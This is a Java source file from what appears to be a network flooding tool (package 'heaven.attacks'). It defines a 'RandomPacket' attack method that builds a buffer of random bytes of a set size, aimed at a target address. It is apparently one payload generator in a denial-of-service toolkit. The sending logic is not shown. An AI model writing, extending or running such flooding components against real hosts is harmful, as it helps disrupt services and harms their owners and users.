package heaven.attacks.implementations;

import heaven.Instance;
import heaven.attacks.Method;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;

import java.net.InetSocketAddress;

public class RandomPacket extends Method {
    int size;

    public RandomPacket(int size) {
        if (size > Instance.bufferLimit) Instance.exceptionCaught();
        this.size = size;
    }

    @Override
    public ByteBuf createData(InetSocketAddress target) {
        ByteBuf buffer = Unpooled.buffer();
        for (int index = 0; index < size; index++)
            buffer.writeByte((int) (Math.random() * Byte.MAX_VALUE));
        return buffer;
    }
}
